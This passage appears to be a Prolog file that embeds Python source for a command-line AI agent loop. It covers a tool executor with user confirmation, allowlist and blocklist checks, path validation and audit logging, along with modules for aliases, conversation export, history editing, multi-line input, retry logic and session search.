        """Ask user to confirm execution of a destructive tool."""
        print(f"\\n[Tool: {tool_call.name}]")

        if tool_call.name == \'bash\':
            cmd = tool_call.arguments.get(\'command\', \'\')
            print(f"  Command: {cmd}")
        elif tool_call.name == \'write\':
            path = tool_call.arguments.get(\'path\', \'\')
            print(f"  File: {path}")
        elif tool_call.name == \'edit\':
            path = tool_call.arguments.get(\'path\', \'\')
            old = tool_call.arguments.get(\'old_string\', \'\')[:50]
            print(f"  File: {path}")
            print(f"  Replace: {old}...")

        try:
            response = input("Execute? [y/N]: ").strip().lower()
            return response in (\'y\', \'yes\')
        except (EOFError, KeyboardInterrupt):
            return False

    def _is_safe_command(self, tool_call: ToolCall) -> bool:
        """Check if a tool call is safe enough to skip confirmation."""
        if tool_call.name != \'bash\':
            return False
        if not self.security.safe_commands:
            return False

        command = tool_call.arguments.get(\'command\', \'\').strip()
        return any(
            re.search(pat, command, re.IGNORECASE)
            for pat in self.security.safe_commands
        )

    def _pre_check_bash(self, args: dict) -> ToolResult | None:
        """Run security checks on a bash command BEFORE confirmation."""
        command = args.get(\'command\', \'\').strip()
        if not command:
            return ToolResult(
                success=False,
                output="No command provided",
                tool_name=\'bash\'
            )

        if self.security.allowed_commands_only:
            matched = any(
                re.search(pat, command, re.IGNORECASE)
                for pat in self.security.allowed_commands
            )
            if not matched:
                reason = "Command not in allowlist"
                self.audit.log_command(command, allowed=False, reason=reason)
                return ToolResult(
                    success=False,
                    output=f"[Security] {reason}",
                    tool_name=\'bash\'
                )

        if self.security.command_blocklist:
            reason = is_command_blocked(
                command,
                extra_blocked=self.security.blocked_commands,
                extra_allowed=self.security.allowed_commands if not self.security.allowed_commands_only else None,
            )
            if reason:
                self.audit.log_command(command, allowed=False, reason=reason)
                return ToolResult(
                    success=False,
                    output=f"[Security] {reason}",
                    tool_name=\'bash\'
                )

        if self.proxy:
            proxy_mode = self.security.command_proxying
            allowed, reason = self.proxy.check(command, proxy_mode)
            if not allowed:
                self.audit.log_command(command, allowed=False, reason=reason)
                self.audit.log_proxy_action(command, \'\', \'block\', reason or \'\')
                return ToolResult(
                    success=False,
                    output=f"[Security/Proxy] {reason}",
                    tool_name=\'bash\'
                )

        return None

    def _execute_bash(self, args: dict) -> ToolResult:
        """Execute a bash command."""
        command = args.get(\'command\', \'\')
        if not command:
            return ToolResult(
                success=False,
                output="No command provided",
                tool_name=\'bash\'
            )

        exec_env = None
        exec_cmd = command

        if self.path_proxy:
            log_file = self.audit._log_file if self.audit._log_file else None
            exec_env = self.path_proxy.build_env(
                proxy_mode=self.security.command_proxying,
                audit_log=str(log_file) if log_file else None,
            )

        if self.proot:
            exec_cmd = self.proot.wrap_command(command)
            proot_env = self.proot.build_env_overrides()
            if exec_env is None:
                exec_env = dict(os.environ)
            exec_env.update(proot_env)

        try:
            result = subprocess.run(
                exec_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=120,
                cwd=self.working_dir,
                env=exec_env,
            )

            output = result.stdout
            if result.stderr:
                output += "\\n" + result.stderr

            self.audit.log_command(
                command, allowed=True,
                output=output.strip() if output else None
            )

            return ToolResult(
                success=result.returncode == 0,
                output=output.strip() or "(no output)",
                tool_name=\'bash\'
            )

        except subprocess.TimeoutExpired:
            self.audit.log_command(command, allowed=True, reason=\'timeout\')
            return ToolResult(
                success=False,
                output="Command timed out after 120 seconds",
                tool_name=\'bash\'
            )
        except Exception as e:
            self.audit.log_command(command, allowed=True, reason=str(e))
            return ToolResult(
                success=False,
                output=f"Error: {e}",
                tool_name=\'bash\'
            )

    def _validate_file_path(self, raw_path: str, tool_name: str) -> tuple[Path, ToolResult | None]:
        """Validate and resolve a file path."""
        if not raw_path:
            return Path(), ToolResult(False, "No path provided", tool_name)

        if self.security.path_validation:
            resolved, error = validate_path(
                raw_path, self.working_dir,
                extra_blocked=self.security.blocked_paths,
                extra_allowed=self.security.allowed_paths,
            )
            if error:
                self.audit.log_file_access(raw_path, tool_name, allowed=False, reason=error)
                return Path(resolved), ToolResult(False, f"[Security] {error}", tool_name)
            return Path(resolved), None

        if raw_path.startswith(\'/\'):
            return Path(raw_path), None
        return Path(self.working_dir) / raw_path, None

    def _read_file(self, args: dict) -> ToolResult:
        """Read a file."""
        path = args.get(\'path\', \'\')
        file_path, error = self._validate_file_path(path, \'read\')
        if error:
            return error

        try:
            if self.security.max_file_read_size is not None:
                try:
                    file_size = file_path.stat().st_size
                    if file_size > self.security.max_file_read_size:
                        reason = (f"File too large: {file_size} bytes "
                                  f"(limit: {self.security.max_file_read_size})")
                        self.audit.log_file_access(path, \'read\', allowed=False, reason=reason)
                        return ToolResult(False, f"[Security] {reason}", \'read\')
                except OSError:
                    pass

            content = file_path.read_text()
            self.audit.log_file_access(
                path, \'read\', allowed=True, bytes_count=len(content)
            )
            return ToolResult(
                success=True,
                output=content,
                tool_name=\'read\'
            )
        except FileNotFoundError:
            return ToolResult(
                success=False,
                output=f"File not found: {path}",
                tool_name=\'read\'
            )
        except Exception as e:
            return ToolResult(
                success=False,
                output=f"Error reading file: {e}",
                tool_name=\'read\'
            )

    def _write_file(self, args: dict) -> ToolResult:
        """Write content to a file."""
        path = args.get(\'path\', \'\')
        content = args.get(\'content\', \'\')

        file_path, error = self._validate_file_path(path, \'write\')
        if error:
            return error

        if self.security.max_file_write_size is not None:
            if len(content) > self.security.max_file_write_size:
                reason = (f"Content too large: {len(content)} bytes "
                          f"(limit: {self.security.max_file_write_size})")
                self.audit.log_file_access(path, \'write\', allowed=False, reason=reason)
                return ToolResult(False, f"[Security] {reason}", \'write\')

        try:
            file_path.parent.mkdir(parents=True, exist_ok=True)
            file_path.write_text(content)
            self.audit.log_file_access(
                path, \'write\', allowed=True, bytes_count=len(content)
            )
            return ToolResult(
                success=True,
                output=f"Wrote {len(content)} bytes to {path}",
                tool_name=\'write\'
            )
        except Exception as e:
            return ToolResult(
                success=False,
                output=f"Error writing file: {e}",
                tool_name=\'write\'
            )

    def _edit_file(self, args: dict) -> ToolResult:
        """Edit a file with search/replace."""
        path = args.get(\'path\', \'\')
        old_string = args.get(\'old_string\', \'\')
        new_string = args.get(\'new_string\', \'\')

        file_path, error = self._validate_file_path(path, \'edit\')
        if error:
            return error

        if not old_string:
            return ToolResult(
                success=False,
                output="No old_string provided",
                tool_name=\'edit\'
            )

        try:
            content = file_path.read_text()

            if old_string not in content:
                return ToolResult(
                    success=False,
                    output=f"old_string not found in {path}",
                    tool_name=\'edit\'
                )

            count = content.count(old_string)
            if count > 1:
                return ToolResult(
                    success=False,
                    output=f"old_string found {count} times - must be unique",
                    tool_name=\'edit\'
                )

            new_content = content.replace(old_string, new_string, 1)
            file_path.write_text(new_content)
            self.audit.log_file_access(
                path, \'edit\', allowed=True,
                bytes_count=len(new_content)
            )

            return ToolResult(
                success=True,
                output=f"Edited {path}",
                tool_name=\'edit\'
            )

        except FileNotFoundError:
            return ToolResult(
                success=False,
                output=f"File not found: {path}",
                tool_name=\'edit\'
            )
        except Exception as e:
            return ToolResult(
                success=False,
                output=f"Error editing file: {e}",
                tool_name=\'edit\'
            )

    def format_result_for_agent(self, result: ToolResult) -> str:
        """Format a tool result for sending back to the agent."""
        status = "Success" if result.success else "Failed"
        return f"[Tool {result.tool_name} - {status}]\\n{result.output}"
').

%% =============================================================================
py_fragment(aliases_class_header, 'class AliasManager:
    """Manages command aliases."""

    def __init__(self, config_path: str | Path | None = None):
        self.aliases = DEFAULT_ALIASES.copy()
        self.config_path = Path(config_path) if config_path else self._default_config_path()
        self._load_user_aliases()

    def _default_config_path(self) -> Path:
        return Path.home() / ".agent-loop" / "aliases.json"

    def _load_user_aliases(self) -> None:
        """Load user-defined aliases from config file."""
        if self.config_path.exists():
            try:
                data = json.loads(self.config_path.read_text())
                self.aliases.update(data)
            except (json.JSONDecodeError, IOError):
                pass

    def save_aliases(self) -> None:
        """Save current aliases to config file."""
        self.config_path.parent.mkdir(parents=True, exist_ok=True)
        # Only save non-default aliases
        user_aliases = {
            k: v for k, v in self.aliases.items()
            if k not in DEFAULT_ALIASES or DEFAULT_ALIASES.get(k) != v
        }
        self.config_path.write_text(json.dumps(user_aliases, indent=2))

    def resolve(self, command: str) -> str:
        """Resolve an alias to its full command.

        Returns the original command if no alias found.
        """
        # Handle slash prefix
        if command.startswith(\'/\'):
            cmd = command[1:]
            prefix = \'/\'
        else:
            cmd = command
            prefix = \'\'

        # Check for exact alias match (first word only)
        parts = cmd.split(None, 1)
        if parts:
            first_word = parts[0].lower()
            if first_word in self.aliases:
                # Replace first word with alias expansion
                expanded = self.aliases[first_word]
                if len(parts) > 1:
                    # Append any additional arguments
                    expanded = f"{expanded} {parts[1]}"
                return prefix + expanded

        return command

    def add(self, alias: str, command: str) -> None:
        """Add or update an alias."""
        self.aliases[alias.lower()] = command

    def remove(self, alias: str) -> bool:
        """Remove an alias. Returns True if removed."""
        alias = alias.lower()
        if alias in self.aliases:
            del self.aliases[alias]
            return True
        return False

    def list_aliases(self) -> list[tuple[str, str]]:
        """List all aliases sorted by name."""
        return sorted(self.aliases.items())

    def format_list(self) -> str:
        """Format aliases for display."""
        lines = ["Aliases:"]

        # Group by category
').

%% categories dict is now generated from alias_category/2 facts

py_fragment(aliases_class_footer, '
        for category, keys in categories.items():
            cat_aliases = [(k, self.aliases[k]) for k in keys if k in self.aliases]
            if cat_aliases:
                lines.append(f"\\n  {category}:")
                for alias, cmd in cat_aliases:
                    lines.append(f"    /{alias} -> /{cmd}")

        # User-defined aliases
        user_aliases = [
            (k, v) for k, v in self.aliases.items()
            if k not in DEFAULT_ALIASES
        ]
        if user_aliases:
            lines.append("\\n  User-defined:")
            for alias, cmd in sorted(user_aliases):
                lines.append(f"    /{alias} -> /{cmd}")

        return "\\n".join(lines)').

py_fragment(aliases_create_default, 'def create_default_aliases_file(path: str | Path | None = None) -> Path:
    """Create a default aliases file for user customization."""
    path = Path(path) if path else Path.home() / ".agent-loop" / "aliases.json"
    path.parent.mkdir(parents=True, exist_ok=True)

    example = {
        "# Comment": "Add your custom aliases here",
        "myalias": "backend claude-opus",
        "quick": "backend claude-haiku",
    }
    # Remove comment key
    del example["# Comment"]

    path.write_text(json.dumps(example, indent=2))
    return path').

py_fragment(export_module, '"""Export conversations to various formats."""

from pathlib import Path
from datetime import datetime
from context import ContextManager


class ConversationExporter:
    """Export conversation history to different formats."""

    def __init__(self, context: ContextManager):
        self.context = context

    def to_markdown(self, title: str = "Conversation") -> str:
        """Export conversation to Markdown format."""
        lines = [
            f"# {title}",
            "",
            f"*Exported: {datetime.now().strftime(\'%Y-%m-%d %H:%M:%S\')}*",
            f"*Messages: {self.context.message_count} | Tokens: {self.context.token_count}*",
            "",
            "---",
            ""
        ]

        for msg in self.context.messages:
            role = "**You:**" if msg.role == "user" else "**Assistant:**"
            lines.append(role)
            lines.append("")
            lines.append(msg.content)
            lines.append("")

        return "\\n".join(lines)

    def to_html(self, title: str = "Conversation") -> str:
        """Export conversation to HTML format."""
        messages_html = []

        for msg in self.context.messages:
            role_class = "user" if msg.role == "user" else "assistant"
            role_label = "You" if msg.role == "user" else "Assistant"
            # Escape HTML and preserve newlines
            content = self._escape_html(msg.content).replace("\\n", "<br>")
            messages_html.append(f\'\'\'
        <div class="message {role_class}">
            <div class="role">{role_label}</div>
            <div class="content">{content}</div>
        </div>\'\'\')

        return f\'\'\'<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{self._escape_html(title)}</title>
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: #f5f5f5;
        }}
        h1 {{
            color: #333;
            border-bottom: 2px solid #ddd;
            padding-bottom: 10px;
        }}
        .meta {{
            color: #666;
            font-size: 0.9em;
            margin-bottom: 20px;
        }}
        .message {{
            margin: 15px 0;
            padding: 15px;
            border-radius: 8px;
        }}
        .message.user {{
            background: #e3f2fd;
            margin-left: 20px;
        }}
        .message.assistant {{
            background: #fff;
            border: 1px solid #ddd;
            margin-right: 20px;
        }}
        .role {{
            font-weight: bold;
            margin-bottom: 8px;
            color: #555;
        }}
        .content {{
            line-height: 1.6;
            white-space: pre-wrap;
        }}
        code {{
            background: #f0f0f0;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: \'Consolas\', \'Monaco\', monospace;
        }}
        pre {{
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }}
    </style>
</head>
<body>
    <h1>{self._escape_html(title)}</h1>
    <div class="meta">
        Exported: {datetime.now().strftime(\'%Y-%m-%d %H:%M:%S\')} |
        Messages: {self.context.message_count} |
        Tokens: {self.context.token_count}
    </div>
    {"".join(messages_html)}
</body>
</html>\'\'\'

    def to_json(self) -> str:
        """Export conversation to JSON format."""
        import json
        data = {
            "exported": datetime.now().isoformat(),
            "message_count": self.context.message_count,
            "token_count": self.context.token_count,
            "messages": [
                {
                    "role": msg.role,
                    "content": msg.content,
                    "tokens": msg.tokens
                }
                for msg in self.context.messages
            ]
        }
        return json.dumps(data, indent=2)

    def to_text(self) -> str:
        """Export conversation to plain text format."""
        lines = [
            f"Conversation Export",
            f"Exported: {datetime.now().strftime(\'%Y-%m-%d %H:%M:%S\')}",
            f"Messages: {self.context.message_count} | Tokens: {self.context.token_count}",
            "",
            "=" * 60,
            ""
        ]

        for msg in self.context.messages:
            role = "You:" if msg.role == "user" else "Assistant:"
            lines.append(role)
            lines.append(msg.content)
            lines.append("")
            lines.append("-" * 40)
            lines.append("")

        return "\\n".join(lines)

    def save(self, path: str | Path, format: str = "auto", title: str = "Conversation") -> None:
        """Save conversation to file.

        Args:
            path: Output file path
            format: Export format (\'markdown\', \'html\', \'json\', \'text\', \'auto\')
            title: Title for the export
        """
        path = Path(path)

        # Auto-detect format from extension
        if format == "auto":
            ext = path.suffix.lower()
            format_map = {
                ".md": "markdown",
                ".html": "html",
                ".htm": "html",
                ".json": "json",
                ".txt": "text"
            }
            format = format_map.get(ext, "markdown")

        # Generate content
        if format == "markdown":
            content = self.to_markdown(title)
        elif format == "html":
            content = self.to_html(title)
        elif format == "json":
            content = self.to_json()
        else:
            content = self.to_text()

        path.write_text(content)

    def _escape_html(self, text: str) -> str:
        """Escape HTML special characters."""
        return (text
                .replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace(\'"\', "&quot;"))').

py_fragment(history_module, '"""Conversation history management with edit/delete support."""

from dataclasses import dataclass
from typing import Literal
from context import ContextManager, Message


@dataclass
class HistoryEntry:
    """A numbered entry in the conversation history."""
    index: int
    role: str
    content: str
    tokens: int
    truncated: bool = False


class HistoryManager:
    """Manages conversation history with edit/delete capabilities."""

    def __init__(self, context: ContextManager):
        self.context = context
        self._undo_stack: list[list[Message]] = []
        self._max_undo = 10

    def get_entries(self, limit: int = 20) -> list[HistoryEntry]:
        """Get recent history entries with indices."""
        entries = []
        messages = self.context.messages[-limit:] if limit else self.context.messages
        start_idx = len(self.context.messages) - len(messages)

        for i, msg in enumerate(messages):
            content = msg.content
            truncated = False
            if len(content) > 100:
                content = content[:97] + "..."
                truncated = True

            entries.append(HistoryEntry(
                index=start_idx + i,
                role=msg.role,
                content=content,
                tokens=msg.tokens,
                truncated=truncated
            ))

        return entries

    def format_history(self, limit: int = 10) -> str:
        """Format history for display."""
        entries = self.get_entries(limit)
        if not entries:
            return "No messages in history."

        lines = [f"Last {len(entries)} messages:"]
        for e in entries:
            role = "You" if e.role == "user" else "Asst"
            # Show first line only, truncated
            first_line = e.content.split(\'\\n\')[0]
            if len(first_line) > 60:
                first_line = first_line[:57] + "..."
            lines.append(f"  [{e.index}] {role}: {first_line}")

        return "\\n".join(lines)

    def get_message(self, index: int) -> Message | None:
        """Get a message by index."""
        if 0 <= index < len(self.context.messages):
            return self.context.messages[index]
        return None

    def get_full_content(self, index: int) -> str | None:
        """Get full content of a message by index."""
        msg = self.get_message(index)
        return msg.content if msg else None

    def edit_message(self, index: int, new_content: str) -> bool:
        """Edit a message\'s content."""
        if not 0 <= index < len(self.context.messages):
            return False

        # Save state for undo
        self._save_state()

        # Edit the message
        old_msg = self.context.messages[index]
        self.context.messages[index] = Message(
            role=old_msg.role,
            content=new_content,
            tokens=old_msg.tokens  # Keep original token count
        )
        return True

    def delete_message(self, index: int) -> bool:
        """Delete a message by index."""
        if not 0 <= index < len(self.context.messages):
            return False

        # Save state for undo
        self._save_state()

        # Remove the message
        removed = self.context.messages.pop(index)
        self.context._token_count -= removed.tokens
        return True

    def delete_range(self, start: int, end: int) -> int:
        """Delete a range of messages [start, end]. Returns count deleted."""
        if start < 0:
            start = 0
        if end >= len(self.context.messages):
            end = len(self.context.messages) - 1
        if start > end:
            return 0

        # Save state for undo
        self._save_state()

        # Remove messages in reverse order to preserve indices
        count = 0
        for i in range(end, start - 1, -1):
            if 0 <= i < len(self.context.messages):
                removed = self.context.messages.pop(i)
                self.context._token_count -= removed.tokens
                count += 1

        return count

    def delete_last(self, n: int = 1) -> int:
        """Delete the last N messages. Returns count deleted."""
        if n <= 0:
            return 0

        # Save state for undo
        self._save_state()

        count = 0
        for _ in range(n):
            if self.context.messages:
                removed = self.context.messages.pop()
                self.context._token_count -= removed.tokens
                count += 1

        return count

    def undo(self) -> bool:
        """Undo the last edit/delete operation."""
        if not self._undo_stack:
            return False

        # Restore previous state
        self.context.messages = self._undo_stack.pop()
        self.context._token_count = sum(m.tokens for m in self.context.messages)
        return True

    def _save_state(self) -> None:
        """Save current state for undo."""
        # Deep copy messages
        state = [
            Message(role=m.role, content=m.content, tokens=m.tokens)
            for m in self.context.messages
        ]
        self._undo_stack.append(state)

        # Limit undo stack size
        while len(self._undo_stack) > self._max_undo:
            self._undo_stack.pop(0)

    def can_undo(self) -> bool:
        """Check if undo is available."""
        return len(self._undo_stack) > 0

    def truncate_after(self, index: int) -> int:
        """Delete all messages after index. Returns count deleted."""
        if index < 0 or index >= len(self.context.messages) - 1:
            return 0

        # Save state for undo
        self._save_state()

        count = 0
        while len(self.context.messages) > index + 1:
            removed = self.context.messages.pop()
            self.context._token_count -= removed.tokens
            count += 1

        return count

    def replay_from(self, index: int) -> str | None:
        """Get the user message at index for replay.

        Truncates history after that point so the message can be re-sent.
        """
        msg = self.get_message(index)
        if msg is None or msg.role != "user":
            return None

        # Get the content before truncating
        content = msg.content

        # Truncate to just before this message
        self.truncate_after(index - 1)

        return content').

py_fragment(multiline_module, '"""Multi-line input support for the agent loop."""

import select
import sys


def _read_pasted_lines(first_line: str, timeout: float = 0.05) -> str:
    """After reading first_line via input(), check for pasted continuation lines.

    Uses select() with a short timeout to detect if more data arrived on stdin
    in rapid succession (i.e. a paste, not typing).
    """
    lines = [first_line]
    try:
        while True:
            ready, _, _ = select.select([sys.stdin], [], [], timeout)
            if not ready:
                break
            line = sys.stdin.readline()
            if not line:
                break
            lines.append(line.rstrip(\'\\n\'))
    except (OSError, ValueError):
        pass
    return \'\\n\'.join(lines)


def get_multiline_input(prompt: str = "You: ", end_marker: str = "EOF") -> str | None:
    """Get multi-line input from the user.

    Input ends when:
    - User enters the end_marker on its own line (default: EOF)
    - User presses Ctrl+D (EOF)
    - User enters a blank line after text (optional quick mode)

    Returns None on true EOF (Ctrl+D with no input).
    """
    print(f"{prompt}(multi-line mode, enter \'{end_marker}\' or Ctrl+D to finish)")
    lines = []

    try:
        while True:
            line = input()
            if line.strip() == end_marker:
                break
            lines.append(line)
    except EOFError:
        if not lines:
            return None

    return "\\n".join(lines)


def get_input_smart(prompt: str = "You: ") -> str | None:
    """Smart input that detects when multi-line is needed.

    Detection order:
    1. Paste detection (if tty) — captures all pasted lines immediately
    2. If single line, check triggers: ```, <<<, \\\\, {/[/(

    Returns None on EOF.
    """
    try:
        line = input(prompt)
    except EOFError:
        return None

    if not line:
        return ""

    # Paste detection first — if multiple lines arrived, return them all
    if sys.stdin.isatty():
        pasted = _read_pasted_lines(line)
        if \'\\n\' in pasted:
            return pasted
        # Single line — fall through to trigger checks

    stripped = line.strip()

    # Check for multi-line triggers (only for typed single lines)
    if stripped.startswith("```"):
        # Code block mode - read until closing ```
        lines = [line]
        try:
            while True:
                next_line = input()
                lines.append(next_line)
                if next_line.strip() == "```" or next_line.strip().startswith("```"):
                    break
        except EOFError:
            pass
        return "\\n".join(lines)

    if stripped.startswith("<<<"):
        # Heredoc mode - read until marker
        marker = stripped[3:].strip() or "EOF"
        lines = []
        print(f"(enter \'{marker}\' to finish)")
        try:
            while True:
                next_line = input()
                if next_line.strip() == marker:
                    break
                lines.append(next_line)
        except EOFError:
            pass
        return "\\n".join(lines)

    if stripped.endswith("\\\\"):
        # Line continuation mode
        lines = [line.rstrip("\\\\")]
        try:
            while True:
                next_line = input("... ")
                if next_line.endswith("\\\\"):
                    lines.append(next_line.rstrip("\\\\"))
                else:
                    lines.append(next_line)
                    break
        except EOFError:
            pass
        return "\\n".join(lines)

    if stripped in (\'{\', \'[\', \'(\'):
        # Data structure mode - read until matching close
        open_char = stripped
        close_char = {\'{\': \'}\', \'[\': \']\', \'(\': \')\'}[open_char]
        lines = [line]
        depth = 1
        print(f"(enter until matching \'{close_char}\')")
        try:
            while depth > 0:
                next_line = input("... ")
                lines.append(next_line)
                # Simple depth tracking (doesn\'t handle strings properly)
                depth += next_line.count(open_char) - next_line.count(close_char)
        except EOFError:
            pass
        return "\\n".join(lines)

    return line


class MultilineInputHandler:
    """Handles multi-line input with various modes."""

    def __init__(
        self,
        prompt: str = "You: ",
        continuation_prompt: str = "... ",
        end_marker: str = "EOF"
    ):
        self.prompt = prompt
        self.continuation_prompt = continuation_prompt
        self.end_marker = end_marker
        self.multiline_mode = False

    def get_input(self) -> str | None:
        """Get input, handling multi-line when needed."""
        if self.multiline_mode:
            return self._get_explicit_multiline()
        return get_input_smart(self.prompt)

    def _get_explicit_multiline(self) -> str | None:
        """Get multi-line input in explicit mode."""
        return get_multiline_input(self.prompt, self.end_marker)

    def toggle_multiline(self) -> bool:
        """Toggle explicit multi-line mode. Returns new state."""
        self.multiline_mode = not self.multiline_mode
        return self.multiline_mode


def paste_mode() -> str:
    """Enter paste mode for pasting large blocks of text.

    Reads all input until Ctrl+D without any processing.
    """
    print("Paste mode: paste your text, then press Ctrl+D")
    lines = []
    try:
        while True:
            line = sys.stdin.readline()
            if not line:  # EOF
                break
            lines.append(line.rstrip(\'\\n\'))
    except KeyboardInterrupt:
        pass

    return "\\n".join(lines)').

py_fragment(retry_module, '"""Retry logic for transient failures."""

import time
import random
from typing import Callable, TypeVar, Any
from functools import wraps

T = TypeVar("T")


class RetryError(Exception):
    """Raised when all retry attempts fail."""

    def __init__(self, message: str, last_error: Exception, attempts: int):
        super().__init__(message)
        self.last_error = last_error
        self.attempts = attempts


def retry(
    max_attempts: int = 3,
    base_delay: float = 1.0,
    max_delay: float = 60.0,
    exponential_base: float = 2.0,
    jitter: bool = True,
    retryable_exceptions: tuple = (Exception,),
    on_retry: Callable[[Exception, int, float], None] | None = None
) -> Callable:
    """Decorator for retrying functions with exponential backoff.

    Args:
        max_attempts: Maximum number of attempts (including first try)
        base_delay: Initial delay between retries in seconds
        max_delay: Maximum delay between retries
        exponential_base: Base for exponential backoff
        jitter: Add random jitter to delays
        retryable_exceptions: Tuple of exception types to retry on
        on_retry: Callback called before each retry (exception, attempt, delay)

    Example:
        @retry(max_attempts=3, base_delay=1.0)
        def call_api():
            return requests.get(url)
    """
    def decorator(func: Callable[..., T]) -> Callable[..., T]:
        @wraps(func)
        def wrapper(*args, **kwargs) -> T:
            last_exception = None

            for attempt in range(1, max_attempts + 1):
                try:
                    return func(*args, **kwargs)
                except retryable_exceptions as e:
                    last_exception = e

                    if attempt == max_attempts:
                        raise RetryError(
                            f"Failed after {max_attempts} attempts: {e}",
                            last_error=e,
                            attempts=max_attempts
                        )

                    # Calculate delay with exponential backoff
                    delay = min(
                        base_delay * (exponential_base ** (attempt - 1)),
                        max_delay
                    )

                    # Add jitter
                    if jitter:
                        delay = delay * (0.5 + random.random())

                    # Call retry callback
                    if on_retry:
                        on_retry(e, attempt, delay)

                    time.sleep(delay)

            # Should never reach here, but just in case
            raise RetryError(
                f"Failed after {max_attempts} attempts",
                last_error=last_exception,
                attempts=max_attempts
            )

        return wrapper
    return decorator


def retry_call(
    func: Callable[..., T],
    args: tuple = (),
    kwargs: dict | None = None,
    max_attempts: int = 3,
    base_delay: float = 1.0,
    max_delay: float = 60.0,
    exponential_base: float = 2.0,
    jitter: bool = True,
    retryable_exceptions: tuple = (Exception,),
    on_retry: Callable[[Exception, int, float], None] | None = None
) -> T:
    """Call a function with retry logic.

    Args:
        func: Function to call
        args: Positional arguments for the function
        kwargs: Keyword arguments for the function
        max_attempts: Maximum number of attempts
        base_delay: Initial delay between retries
        max_delay: Maximum delay between retries
        exponential_base: Base for exponential backoff
        jitter: Add random jitter to delays
        retryable_exceptions: Tuple of exception types to retry on
        on_retry: Callback called before each retry

    Example:
        result = retry_call(
            requests.get,
            args=(url,),
            kwargs={"timeout": 10},
            max_attempts=3
        )
    """
    kwargs = kwargs or {}

    @retry(
        max_attempts=max_attempts,
        base_delay=base_delay,
        max_delay=max_delay,
        exponential_base=exponential_base,
        jitter=jitter,
        retryable_exceptions=retryable_exceptions,
        on_retry=on_retry
    )
    def wrapped():
        return func(*args, **kwargs)

    return wrapped()


# Common retryable exception patterns for API calls
API_RETRYABLE_ERRORS = (
    ConnectionError,
    TimeoutError,
    OSError,
)

# For use with requests library
def is_retryable_status(status_code: int) -> bool:
    """Check if an HTTP status code is retryable."""
    return status_code in (
        408,  # Request Timeout
        429,  # Too Many Requests
        500,  # Internal Server Error
        502,  # Bad Gateway
        503,  # Service Unavailable
        504,  # Gateway Timeout
    )


class RetryableAPIError(Exception):
    """Exception for retryable API errors."""

    def __init__(self, message: str, status_code: int | None = None):
        super().__init__(message)
        self.status_code = status_code').

py_fragment(search_module, '"""Search across conversation sessions."""

import json
import re
from pathlib import Path
from dataclasses import dataclass
from typing import Iterator


@dataclass
class SearchResult:
    """A single search result."""
    session_id: str
    session_name: str
    message_index: int
    role: str
    content: str
    match_start: int
    match_end: int
    context_before: str
    context_after: str

    def format(self, max_width: int = 80) -> str:
        """Format result for display."""
        # Highlight the match
        before = self.content[:self.match_start]
        match = self.content[self.match_start:self.match_end]
        after = self.content[self.match_end:]

        # Truncate if too long
        if len(before) > 30:
            before = "..." + before[-27:]
        if len(after) > 30:
            after = after[:27] + "..."

        snippet = f"{before}**{match}**{after}"

        return f"[{self.session_id}] {self.role}: {snippet}"


class SessionSearcher:
    """Search through saved conversation sessions."""

    def __init__(self, sessions_dir: str | Path):
        self.sessions_dir = Path(sessions_dir)

    def search(
        self,
        query: str,
        case_sensitive: bool = False,
        regex: bool = False,
        role_filter: str | None = None,
        limit: int = 50
    ) -> list[SearchResult]:
        """Search for a query across all sessions.

        Args:
            query: Search query (string or regex pattern)
            case_sensitive: Whether search is case-sensitive
            regex: Treat query as regex pattern
            role_filter: Filter by role (\'user\' or \'assistant\')
            limit: Maximum number of results

        Returns:
            List of SearchResult objects
        """
        results = []

        # Compile pattern
        flags = 0 if case_sensitive else re.IGNORECASE
        if regex:
            pattern = re.compile(query, flags)
        else:
            pattern = re.compile(re.escape(query), flags)

        # Search each session
        for session_path in self.sessions_dir.glob("*.json"):
            try:
                session_results = self._search_session(
                    session_path, pattern, role_filter
                )
                results.extend(session_results)

                if len(results) >= limit:
                    break
            except (json.JSONDecodeError, KeyError):
                continue

        return results[:limit]

    def _search_session(
        self,
        session_path: Path,
        pattern: re.Pattern,
        role_filter: str | None
    ) -> list[SearchResult]:
        """Search within a single session file."""
        results = []

        data = json.loads(session_path.read_text())
        session_id = data.get("metadata", {}).get("id", session_path.stem)
        session_name = data.get("metadata", {}).get("name", "Unnamed")

        for i, msg in enumerate(data.get("messages", [])):
            role = msg.get("role", "unknown")
            content = msg.get("content", "")

            # Apply role filter
            if role_filter and role != role_filter:
                continue

            # Find all matches in this message
            for match in pattern.finditer(content):
                # Extract context
                start = max(0, match.start() - 50)
                end = min(len(content), match.end() + 50)

                results.append(SearchResult(
                    session_id=session_id,
                    session_name=session_name,
                    message_index=i,
                    role=role,
                    content=content,
                    match_start=match.start(),
                    match_end=match.end(),
                    context_before=content[start:match.start()],
                    context_after=content[match.end():end]
                ))

        return results

    def search_in_session(
        self,
        session_id: str,
        query: str,
        case_sensitive: bool = False
    ) -> list[SearchResult]:
        """Search within a specific session."""
        session_path = self.sessions_dir / f"{session_id}.json"
        if not session_path.exists():
            return []

        flags = 0 if case_sensitive else re.IGNORECASE
        pattern = re.compile(re.escape(query), flags)

        return self._search_session(session_path, pattern, None)

    def list_sessions_containing(
        self,
        query: str,
        case_sensitive: bool = False
    ) -> list[dict]:
        """List sessions that contain a query (without full results)."""
        flags = 0 if case_sensitive else re.IGNORECASE
        pattern = re.compile(re.escape(query), flags)

        sessions = []

        for session_path in self.sessions_dir.glob("*.json"):
            try:
                data = json.loads(session_path.read_text())
                messages = data.get("messages", [])

                # Check if any message matches
                match_count = 0
                for msg in messages:
                    content = msg.get("content", "")
                    match_count += len(pattern.findall(content))

                if match_count > 0:
                    metadata = data.get("metadata", {})
                    sessions.append({
                        "id": metadata.get("id", session_path.stem),
                        "name": metadata.get("name", "Unnamed"),
                        "match_count": match_count,
                        "message_count": len(messages)
                    })
            except (json.JSONDecodeError, KeyError):
                continue

        # Sort by match count
        sessions.sort(key=lambda x: x["match_count"], reverse=True)
        return sessions

    def get_session_stats(self) -> dict:
        """Get statistics about all sessions."""
        total_sessions = 0
        total_messages = 0
